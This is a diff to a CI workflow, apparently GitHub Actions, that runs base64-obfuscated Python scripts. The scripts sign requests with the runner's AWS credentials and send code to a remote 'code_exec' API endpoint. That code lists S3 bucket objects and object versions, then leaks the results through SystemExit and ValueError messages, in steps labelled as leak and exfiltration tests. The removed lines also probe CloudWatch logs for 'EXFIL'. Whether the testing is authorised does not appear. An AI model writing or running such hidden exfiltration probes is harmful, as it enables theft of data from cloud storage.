@@ -24,34 +24,18 @@ jobs:
           B64='aW1wb3J0IGJvdG8zLCBiYXNlNjQsIHJlcXVlc3RzCmZyb20gcmVxdWVzdHNfYXdzNGF1dGggaW1wb3J0IEFXUzRBdXRoCkFQSSA9ICdodHRwczovL2w4c3N5YXo2OWYuZXhlY3V0ZS1hcGkudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vZGV2L2NvZGVfZXhlYycKY3JlZHMgPSBib3RvMy5TZXNzaW9uKCkuZ2V0X2NyZWRlbnRpYWxzKCkuZ2V0X2Zyb3plbl9jcmVkZW50aWFscygpCmF1dGggPSBBV1M0QXV0aChjcmVkcy5hY2Nlc3Nfa2V5LCBjcmVkcy5zZWNyZXRfa2V5LCAndXMtZWFzdC0xJywgJ2V4ZWN1dGUtYXBpJywgc2Vzc2lvbl90b2tlbj1jcmVkcy50b2tlbikKY29kZSA9ICJpbXBvcnQgYm90bzMsIHRpbWVcbnMgPSBib3RvMy5jbGllbnQoJ3MzJywgcmVnaW9uX25hbWU9J3VzLWVhc3QtMScpXG50cyA9IHN0cihpbnQodGltZS50aW1lKCkpKVxucy5wdXRfb2JqZWN0KEJ1Y2tldD0nbG9nYWQ4OGUyYjE2OGFhMzg3ZScsIEtleT0ncGluZ18nK3RzKycudHh0JywgQm9keT1iJ2FsaXZlJylcbiIKciA9IHJlcXVlc3RzLnBvc3QoQVBJLCBqc29uPXsnY29kZSc6IGJhc2U2NC5iNjRlbmNvZGUoY29kZS5lbmNvZGUoKSkuZGVjb2RlKCl9LCBhdXRoPWF1dGgpCnByaW50KHIuc3RhdHVzX2NvZGUsIHIudGV4dCkK'
           printf '%s' "$B64" | base64 -d > /tmp/t1.py && python3 /tmp/t1.py
 
-      - name: Test exception leak
+      - name: Leak tests
         run: |
-          B64='aW1wb3J0IGJvdG8zLCBiYXNlNjQsIHJlcXVlc3RzCmZyb20gcmVxdWVzdHNfYXdzNGF1dGggaW1wb3J0IEFXUzRBdXRoCkFQSSA9ICdodHRwczovL2w4c3N5YXo2OWYuZXhlY3V0ZS1hcGkudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vZGV2L2NvZGVfZXhlYycKY3JlZHMgPSBib3RvMy5TZXNzaW9uKCkuZ2V0X2NyZWRlbnRpYWxzKCkuZ2V0X2Zyb3plbl9jcmVkZW50aWFscygpCmF1dGggPSBBV1M0QXV0aChjcmVkcy5hY2Nlc3Nfa2V5LCBjcmVkcy5zZWNyZXRfa2V5LCAndXMtZWFzdC0xJywgJ2V4ZWN1dGUtYXBpJywgc2Vzc2lvbl90b2tlbj1jcmVkcy50b2tlbikKY29kZSA9ICJpbXBvcnQgYm90bzNcbnMgPSBib3RvMy5jbGllbnQoJ3MzJywgcmVnaW9uX25hbWU9J3VzLWVhc3QtMScpXG5vYmpzID0gcy5saXN0X29iamVjdHNfdjIoQnVja2V0PSd1c2VyYWQ4OGUyYjE2OGFhMzg3ZScsIE1heEtleXM9MjApXG5rZXlzID0gc3RyKFtvWydLZXknXSBmb3IgbyBpbiBvYmpzLmdldCgnQ29udGVudHMnLCBbXSldKVxucmFpc2UgVmFsdWVFcnJvcignTEVBSzonICsga2V5cylcbiIKciA9IHJlcXVlc3RzLnBvc3QoQVBJLCBqc29uPXsnY29kZSc6IGJhc2U2NC5iNjRlbmNvZGUoY29kZS5lbmNvZGUoKSkuZGVjb2RlKCl9LCBhdXRoPWF1dGgpCnByaW50KHIuc3RhdHVzX2NvZGUsIHIudGV4dCkK'
+          pip install requests requests-aws4auth --quiet
+
+          echo "=== T1 SystemExit ==="
+          B64='aW1wb3J0IGJvdG8zLCBiYXNlNjQsIHJlcXVlc3RzCmZyb20gcmVxdWVzdHNfYXdzNGF1dGggaW1wb3J0IEFXUzRBdXRoCkFQSSA9ICdodHRwczovL2w4c3N5YXo2OWYuZXhlY3V0ZS1hcGkudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vZGV2L2NvZGVfZXhlYycKY3JlZHMgPSBib3RvMy5TZXNzaW9uKCkuZ2V0X2NyZWRlbnRpYWxzKCkuZ2V0X2Zyb3plbl9jcmVkZW50aWFscygpCmF1dGggPSBBV1M0QXV0aChjcmVkcy5hY2Nlc3Nfa2V5LCBjcmVkcy5zZWNyZXRfa2V5LCAndXMtZWFzdC0xJywgJ2V4ZWN1dGUtYXBpJywgc2Vzc2lvbl90b2tlbj1jcmVkcy50b2tlbikKY29kZSA9ICdyYWlzZSBTeXN0ZW1FeGl0KCJFWEZJTF9URVNUX1NZU1RFTUVYSVQiKScKciA9IHJlcXVlc3RzLnBvc3QoQVBJLCBqc29uPXsnY29kZSc6IGJhc2U2NC5iNjRlbmNvZGUoY29kZS5lbmNvZGUoKSkuZGVjb2RlKCl9LCBhdXRoPWF1dGgpCnByaW50KHIuc3RhdHVzX2NvZGUsIHIudGV4dCkK'
+          printf '%s' "$B64" | base64 -d > /tmp/t1.py && python3 /tmp/t1.py
+
+          echo "=== T2 logad list ==="
+          B64='aW1wb3J0IGJvdG8zLCBiYXNlNjQsIHJlcXVlc3RzCmZyb20gcmVxdWVzdHNfYXdzNGF1dGggaW1wb3J0IEFXUzRBdXRoCkFQSSA9ICdodHRwczovL2w4c3N5YXo2OWYuZXhlY3V0ZS1hcGkudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vZGV2L2NvZGVfZXhlYycKY3JlZHMgPSBib3RvMy5TZXNzaW9uKCkuZ2V0X2NyZWRlbnRpYWxzKCkuZ2V0X2Zyb3plbl9jcmVkZW50aWFscygpCmF1dGggPSBBV1M0QXV0aChjcmVkcy5hY2Nlc3Nfa2V5LCBjcmVkcy5zZWNyZXRfa2V5LCAndXMtZWFzdC0xJywgJ2V4ZWN1dGUtYXBpJywgc2Vzc2lvbl90b2tlbj1jcmVkcy50b2tlbikKY29kZSA9ICJpbXBvcnQgYm90bzNcbnMgPSBib3RvMy5jbGllbnQoJ3MzJywgcmVnaW9uX25hbWU9J3VzLWVhc3QtMScpXG5vYmpzID0gcy5saXN0X29iamVjdHNfdjIoQnVja2V0PSdsb2dhZDg4ZTJiMTY4YWEzODdlJywgTWF4S2V5cz0xMClcbmtleXMgPSBzdHIoW29bJ0tleSddIGZvciBvIGluIG9ianMuZ2V0KCdDb250ZW50cycsIFtdKV0pXG5yYWlzZSBTeXN0ZW1FeGl0KGtleXMpIgpyID0gcmVxdWVzdHMucG9zdChBUEksIGpzb249eydjb2RlJzogYmFzZTY0LmI2NGVuY29kZShjb2RlLmVuY29kZSgpKS5kZWNvZGUoKX0sIGF1dGg9YXV0aCkKcHJpbnQoci5zdGF0dXNfY29kZSwgci50ZXh0KQo='
           printf '%s' "$B64" | base64 -d > /tmp/t2.py && python3 /tmp/t2.py
 
-      - name: Check CloudWatch access
-        run: |
-          echo "=== log groups ==="
-          aws logs describe-log-groups --region us-east-1 2>&1 | head -30
-          echo "=== filter logs ==="
-          aws logs filter-log-events \
-            --region us-east-1 \
-            --log-group-name /aws/lambda/code_exec \
-            --filter-pattern "EXFIL" 2>&1 | head -20
-
-      - name: Test result variable exfil
-        run: |
-          pip install requests requests-aws4auth --quiet
-
-
-      - name: Test result variable + CloudWatch
-        run: |
-          pip install requests requests-aws4auth --quiet
-
-          # Test 1: result variable
-          B64='aW1wb3J0IGJvdG8zLCBiYXNlNjQsIHJlcXVlc3RzCmZyb20gcmVxdWVzdHNfYXdzNGF1dGggaW1wb3J0IEFXUzRBdXRoCkFQSSA9ICdodHRwczovL2w4c3N5YXo2OWYuZXhlY3V0ZS1hcGkudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vZGV2L2NvZGVfZXhlYycKY3JlZHMgPSBib3RvMy5TZXNzaW9uKCkuZ2V0X2NyZWRlbnRpYWxzKCkuZ2V0X2Zyb3plbl9jcmVkZW50aWFscygpCmF1dGggPSBBV1M0QXV0aChjcmVkcy5hY2Nlc3Nfa2V5LCBjcmVkcy5zZWNyZXRfa2V5LCAndXMtZWFzdC0xJywgJ2V4ZWN1dGUtYXBpJywgc2Vzc2lvbl90b2tlbj1jcmVkcy50b2tlbikKY29kZSA9ICdyZXN1bHQgPSAiRVhGSUxfVEVTVF8xMjMiJwpyID0gcmVxdWVzdHMucG9zdChBUEksIGpzb249eydjb2RlJzogYmFzZTY0LmI2NGVuY29kZShjb2RlLmVuY29kZSgpKS5kZWNvZGUoKX0sIGF1dGg9YXV0aCkKcHJpbnQoci5zdGF0dXNfY29kZSwgci50ZXh0KQo='
-          printf '%s' "$B64" | base64 -d > /tmp/t.py && python3 /tmp/t.py
-
-          # Test 2: CloudWatch logs
-          echo "=== log groups ==="
-          aws logs describe-log-groups --region us-east-1 2>&1 | head -40
+          echo "=== T3 versions MaxKeys=2 ==="
+          B64='aW1wb3J0IGJvdG8zLCBiYXNlNjQsIHJlcXVlc3RzCmZyb20gcmVxdWVzdHNfYXdzNGF1dGggaW1wb3J0IEFXUzRBdXRoCkFQSSA9ICdodHRwczovL2w4c3N5YXo2OWYuZXhlY3V0ZS1hcGkudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vZGV2L2NvZGVfZXhlYycKY3JlZHMgPSBib3RvMy5TZXNzaW9uKCkuZ2V0X2NyZWRlbnRpYWxzKCkuZ2V0X2Zyb3plbl9jcmVkZW50aWFscygpCmF1dGggPSBBV1M0QXV0aChjcmVkcy5hY2Nlc3Nfa2V5LCBjcmVkcy5zZWNyZXRfa2V5LCAndXMtZWFzdC0xJywgJ2V4ZWN1dGUtYXBpJywgc2Vzc2lvbl90b2tlbj1jcmVkcy50b2tlbikKY29kZSA9ICJpbXBvcnQgYm90bzNcbnMgPSBib3RvMy5jbGllbnQoJ3MzJywgcmVnaW9uX25hbWU9J3VzLWVhc3QtMScpXG52ID0gcy5saXN0X29iamVjdF92ZXJzaW9ucyhCdWNrZXQ9J3VzZXJhZDg4ZTJiMTY4YWEzODdlJywgTWF4S2V5cz0yKVxucmVzID0gc3RyKHsndic6IFtvWydLZXknXSBmb3IgbyBpbiB2LmdldCgnVmVyc2lvbnMnLFtdKV0sICdkJzogW29bJ0tleSddIGZvciBvIGluIHYuZ2V0KCdEZWxldGVNYXJrZXJzJyxbXSldfSlcbnJhaXNlIFN5c3RlbUV4aXQocmVzKSIKciA9IHJlcXVlc3RzLnBvc3QoQVBJLCBqc29uPXsnY29kZSc6IGJhc2U2NC5iNjRlbmNvZGUoY29kZS5lbmNvZGUoKSkuZGVjb2RlKCl9LCBhdXRoPWF1dGgpCnByaW50KHIuc3RhdHVzX2NvZGUsIHIudGV4dCkK'
+          printf '%s' "$B64" | base64 -d > /tmp/t3.py && python3 /tmp/t3.py
